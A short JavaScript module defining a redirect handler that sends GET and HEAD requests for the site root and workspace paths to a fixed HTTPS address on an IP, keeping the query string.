// Keep the former workspace entry tied to the official reader and review queue.
// Leave historical routes and private service/data bindings untouched.
const paths=new Set(['/', '/workspace', '/workspace/', '/workspace/index.html']);
export function canonicalWorkspaceRedirect(request){
  const from=new URL(request.url);
  if(!['GET','HEAD'].includes(request.method)||!paths.has(from.pathname))return null;
  const destination=new URL('https://3.36.58.188/WhatGloabalStandardsSay/wgss/');
  destination.search=from.search;
  return new Response(null,{status:302,headers:{Location:destination.href,'Cache-Control':'no-store'}});
}
